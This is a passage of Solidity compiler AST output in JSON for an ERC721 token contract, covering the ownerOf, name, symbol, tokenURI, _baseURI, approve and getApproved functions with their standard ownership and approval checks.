ID\""}],"id":186,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"2324:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":194,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2324:56:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":195,"nodeType":"ExpressionStatement","src":"2324:56:1"},{"expression":{"id":196,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":181,"src":"2397:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":179,"id":197,"nodeType":"Return","src":"2390:12:1"}]},"documentation":{"id":172,"nodeType":"StructuredDocumentation","src":"2139:46:1","text":" @dev See {IERC721-ownerOf}."},"functionSelector":"6352211e","id":199,"implemented":true,"kind":"function","modifiers":[],"name":"ownerOf","nameLocation":"2199:7:1","nodeType":"FunctionDefinition","overrides":{"id":176,"nodeType":"OverrideSpecifier","overrides":[],"src":"2244:8:1"},"parameters":{"id":175,"nodeType":"ParameterList","parameters":[{"constant":false,"id":174,"mutability":"mutable","name":"tokenId","nameLocation":"2215:7:1","nodeType":"VariableDeclaration","scope":199,"src":"2207:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":173,"name":"uint256","nodeType":"ElementaryTypeName","src":"2207:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2206:17:1"},"returnParameters":{"id":179,"nodeType":"ParameterList","parameters":[{"constant":false,"id":178,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":199,"src":"2262:7:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":177,"name":"address","nodeType":"ElementaryTypeName","src":"2262:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2261:9:1"},"scope":998,"src":"2190:219:1","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[1144],"body":{"id":208,"nodeType":"Block","src":"2540:29:1","statements":[{"expression":{"id":206,"name":"_name","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":79,"src":"2557:5:1","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"functionReturnParameters":205,"id":207,"nodeType":"Return","src":"2550:12:1"}]},"documentation":{"id":200,"nodeType":"StructuredDocumentation","src":"2415:51:1","text":" @dev See {IERC721Metadata-name}."},"functionSelector":"06fdde03","id":209,"implemented":true,"kind":"function","modifiers":[],"name":"name","nameLocation":"2480:4:1","nodeType":"FunctionDefinition","overrides":{"id":202,"nodeType":"OverrideSpecifier","overrides":[],"src":"2507:8:1"},"parameters":{"id":201,"nodeType":"ParameterList","parameters":[],"src":"2484:2:1"},"returnParameters":{"id":205,"nodeType":"ParameterList","parameters":[{"constant":false,"id":204,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":209,"src":"2525:13:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":203,"name":"string","nodeType":"ElementaryTypeName","src":"2525:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2524:15:1"},"scope":998,"src":"2471:98:1","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[1150],"body":{"id":218,"nodeType":"Block","src":"2704:31:1","statements":[{"expression":{"id":216,"name":"_symbol","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":81,"src":"2721:7:1","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"functionReturnParameters":215,"id":217,"nodeType":"Return","src":"2714:14:1"}]},"documentation":{"id":210,"nodeType":"StructuredDocumentation","src":"2575:53:1","text":" @dev See {IERC721Metadata-symbol}."},"functionSelector":"95d89b41","id":219,"implemented":true,"kind":"function","modifiers":[],"name":"symbol","nameLocation":"2642:6:1","nodeType":"FunctionDefinition","overrides":{"id":212,"nodeType":"OverrideSpecifier","overrides":[],"src":"2671:8:1"},"parameters":{"id":211,"nodeType":"ParameterList","parameters":[],"src":"2648:2:1"},"returnParameters":{"id":215,"nodeType":"ParameterList","parameters":[{"constant":false,"id":214,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":219,"src":"2689:13:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":213,"name":"string","nodeType":"ElementaryTypeName","src":"2689:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2688:15:1"},"scope":998,"src":"2633:102:1","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[1158],"body":{"id":257,"nodeType":"Block","src":"2889:188:1","statements":[{"expression":{"arguments":[{"id":229,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":222,"src":"2914:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":228,"name":"_requireMinted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":876,"src":"2899:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$__$","typeString":"function (uint256) view"}},"id":230,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2899:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":231,"nodeType":"ExpressionStatement","src":"2899:23:1"},{"assignments":[233],"declarations":[{"constant":false,"id":233,"mutability":"mutable","name":"baseURI","nameLocation":"2947:7:1","nodeType":"VariableDeclaration","scope":257,"src":"2933:21:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":232,"name":"string","nodeType":"ElementaryTypeName","src":"2933:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"id":236,"initialValue":{"arguments":[],"expression":{"argumentTypes":[],"id":234,"name":"_baseURI","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":267,"src":"2957:8:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_string_memory_ptr_$","typeString":"function () view returns (string memory)"}},"id":235,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2957:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"nodeType":"VariableDeclarationStatement","src":"2933:34:1"},{"expression":{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":243,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"arguments":[{"id":239,"name":"baseURI","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":233,"src":"2990:7:1","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":238,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2984:5:1","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":237,"name":"bytes","nodeType":"ElementaryTypeName","src":"2984:5:1","typeDescriptions":{}}},"id":240,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2984:14:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":241,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"length","nodeType":"MemberAccess","src":"2984:21:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":242,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3008:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"2984:25:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"hexValue":"","id":254,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"3068:2:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""},"id":255,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"2984:86:1","trueExpression":{"arguments":[{"arguments":[{"id":248,"name":"baseURI","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":233,"src":"3036:7:1","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":249,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":222,"src":"3045:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":250,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"toString","nodeType":"MemberAccess","referencedDeclaration":1569,"src":"3045:16:1","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$bound_to$_t_uint256_$","typeString":"function (uint256) pure returns (string memory)"}},"id":251,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3045:18:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"expression":{"id":246,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"3019:3:1","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":247,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"encodePacked","nodeType":"MemberAccess","src":"3019:16:1","typeDescriptions":{"typeIdentifier":"t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$","typeString":"function () pure returns (bytes memory)"}},"id":252,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3019:45:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":245,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3012:6:1","typeDescriptions":{"typeIdentifier":"t_type$_t_string_storage_ptr_$","typeString":"type(string storage pointer)"},"typeName":{"id":244,"name":"string","nodeType":"ElementaryTypeName","src":"3012:6:1","typeDescriptions":{}}},"id":253,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3012:53:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":227,"id":256,"nodeType":"Return","src":"2977:93:1"}]},"documentation":{"id":220,"nodeType":"StructuredDocumentation","src":"2741:55:1","text":" @dev See {IERC721Metadata-tokenURI}."},"functionSelector":"c87b56dd","id":258,"implemented":true,"kind":"function","modifiers":[],"name":"tokenURI","nameLocation":"2810:8:1","nodeType":"FunctionDefinition","overrides":{"id":224,"nodeType":"OverrideSpecifier","overrides":[],"src":"2856:8:1"},"parameters":{"id":223,"nodeType":"ParameterList","parameters":[{"constant":false,"id":222,"mutability":"mutable","name":"tokenId","nameLocation":"2827:7:1","nodeType":"VariableDeclaration","scope":258,"src":"2819:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":221,"name":"uint256","nodeType":"ElementaryTypeName","src":"2819:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2818:17:1"},"returnParameters":{"id":227,"nodeType":"ParameterList","parameters":[{"constant":false,"id":226,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":258,"src":"2874:13:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":225,"name":"string","nodeType":"ElementaryTypeName","src":"2874:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2873:15:1"},"scope":998,"src":"2801:276:1","stateMutability":"view","virtual":true,"visibility":"public"},{"body":{"id":266,"nodeType":"Block","src":"3385:26:1","statements":[{"expression":{"hexValue":"","id":264,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"3402:2:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""},"functionReturnParameters":263,"id":265,"nodeType":"Return","src":"3395:9:1"}]},"documentation":{"id":259,"nodeType":"StructuredDocumentation","src":"3083:231:1","text":" @dev Base URI for computing {tokenURI}. If set, the resulting URI for each\n token will be the concatenation of the `baseURI` and the `tokenId`. Empty\n by default, can be overridden in child contracts."},"id":267,"implemented":true,"kind":"function","modifiers":[],"name":"_baseURI","nameLocation":"3328:8:1","nodeType":"FunctionDefinition","parameters":{"id":260,"nodeType":"ParameterList","parameters":[],"src":"3336:2:1"},"returnParameters":{"id":263,"nodeType":"ParameterList","parameters":[{"constant":false,"id":262,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":267,"src":"3370:13:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":261,"name":"string","nodeType":"ElementaryTypeName","src":"3370:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"3369:15:1"},"scope":998,"src":"3319:92:1","stateMutability":"view","virtual":true,"visibility":"internal"},{"baseFunctions":[1087],"body":{"id":309,"nodeType":"Block","src":"3538:336:1","statements":[{"assignments":[277],"declarations":[{"constant":false,"id":277,"mutability":"mutable","name":"owner","nameLocation":"3556:5:1","nodeType":"VariableDeclaration","scope":309,"src":"3548:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":276,"name":"address","nodeType":"ElementaryTypeName","src":"3548:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":282,"initialValue":{"arguments":[{"id":280,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":272,"src":"3579:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":278,"name":"ERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":998,"src":"3564:6:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ERC721_$998_$","typeString":"type(contract ERC721)"}},"id":279,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"ownerOf","nodeType":"MemberAccess","referencedDeclaration":199,"src":"3564:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":281,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3564:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"3548:39:1"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":286,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":284,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":270,"src":"3605:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":285,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":277,"src":"3611:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"3605:11:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a20617070726f76616c20746f2063757272656e74206f776e6572","id":287,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"3618:35:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942","typeString":"literal_string \"ERC721: approval to current owner\""},"value":"ERC721: approval to current owner"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942","typeString":"literal_string \"ERC721: approval to current owner\""}],"id":283,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"3597:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":288,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3597:57:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":289,"nodeType":"ExpressionStatement","src":"3597:57:1"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":300,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":294,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[],"expression":{"argumentTypes":[],"id":291,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1501,"src":"3686:10:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":292,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3686:12:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":293,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":277,"src":"3702:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"3686:21:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"arguments":[{"id":296,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":277,"src":"3728:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"arguments":[],"expression":{"argumentTypes":[],"id":297,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1501,"src":"3735:10:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":298,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3735:12:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"}],"id":295,"name":"isApprovedForAll","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":363,"src":"3711:16:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_address_$returns$_t_bool_$","typeString":"function (address,address) view returns (bool)"}},"id":299,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3711:37:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"3686:62:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c","id":301,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"3762:63:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83","typeString":"literal_string \"ERC721: approve caller is not token owner or approved for all\""},"value":"ERC721: approve caller is not token owner or approved for all"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83","typeString":"literal_string \"ERC721: approve caller is not token owner or approved for all\""}],"id":290,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"3665:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":302,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3665:170:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":303,"nodeType":"ExpressionStatement","src":"3665:170:1"},{"expression":{"arguments":[{"id":305,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":270,"src":"3855:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":306,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":272,"src":"3859:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":304,"name":"_approve","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":830,"src":"3846:8:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256)"}},"id":307,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3846:21:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":308,"nodeType":"ExpressionStatement","src":"3846:21:1"}]},"documentation":{"id":268,"nodeType":"StructuredDocumentation","src":"3417:46:1","text":" @dev See {IERC721-approve}."},"functionSelector":"095ea7b3","id":310,"implemented":true,"kind":"function","modifiers":[],"name":"approve","nameLocation":"3477:7:1","nodeType":"FunctionDefinition","overrides":{"id":274,"nodeType":"OverrideSpecifier","overrides":[],"src":"3529:8:1"},"parameters":{"id":273,"nodeType":"ParameterList","parameters":[{"constant":false,"id":270,"mutability":"mutable","name":"to","nameLocation":"3493:2:1","nodeType":"VariableDeclaration","scope":310,"src":"3485:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":269,"name":"address","nodeType":"ElementaryTypeName","src":"3485:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":272,"mutability":"mutable","name":"tokenId","nameLocation":"3505:7:1","nodeType":"VariableDeclaration","scope":310,"src":"3497:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":271,"name":"uint256","nodeType":"ElementaryTypeName","src":"3497:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3484:29:1"},"returnParameters":{"id":275,"nodeType":"ParameterList","parameters":[],"src":"3538:0:1"},"scope":998,"src":"3468:406:1","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"baseFunctions":[1103],"body":{"id":327,"nodeType":"Block","src":"4020:82:1","statements":[{"expression":{"arguments":[{"id":320,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":313,"src":"4045:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":319,"name":"_requireMinted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":876,"src":"4030:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$__$","typeString":"function (uint256) view"}},"id":321,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4030:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":322,"nodeType":"ExpressionStatement","src":"4030:23:1"},{"expression":{"baseExpression":{"id":323,"name":"_tokenApprovals","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":93,"src":"4071:15:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"}},"id":325,"indexExpression":{"id":324,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":313,"src":"4087:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"4071:24:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":318,"id":326,"nodeType":"Return","src":"4064:31:1"}]},"documentation":{"id":311,"nodeType":"StructuredDocumentation","src":"3880:50:1","text":" @dev See {IERC721-getApproved}."},"functionSelector":"081812fc","id":328,"implemented":true,"kind":"function","modifiers":[],"name":"getApproved","nameLocation":"3944:11:1","nodeType":"FunctionDefinition","overrides":{"id":315,"nodeType":"OverrideSpecifier","overrides":[],"src":"3993:8:1"},"parameters":{"id":314,"nodeType":"ParameterList","parameters":[{"constant":false,"id":313,"mutability":"mutable","name":"tokenId","nameLocation":"3964:7:1","nodeType":"VariableDeclaration","scope":328,"src":"3956:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":312,"name":"uint256","nodeType":"ElementaryTypeName","src":"3956:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3955:17:1"},"returnParameters":{"id":318,"nodeType":"ParameterList","parameters":[{"constant":false,"id":317,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":328,"src":"4011:7:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":316,"name":"address","nodeType":"ElementaryTypeName","src":"4011:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4010:9:1"},"scope":998,"src":"3935:167:1","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[1095],"body":{"id":344,"nodeType":"Block","src":"4253:69:1","statements":[{"expression":{"arguments":[{"arguments":[],"expression":{"argumentTypes":[],"id":338,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1501,"src":"4282:10:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns 